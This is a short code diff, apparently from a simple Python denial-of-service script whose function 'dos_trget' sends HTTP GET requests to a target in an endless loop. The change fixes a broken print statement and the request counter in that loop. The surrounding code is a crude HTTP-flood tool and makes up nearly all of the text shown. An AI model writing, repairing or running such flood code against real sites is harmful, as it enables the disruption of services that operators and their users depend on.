@@ -42,7 +42,8 @@ def dos_trget(target):
     while True:
         try:
             rves = requests.get(target)
-            print(f"Request sented to {x = x + 1}")
+            x = x + 1
+            print(f"Request sented {x} to {target}")
 #
         except requests.exceptions.ConnectionError:
             print("Check internet connection")
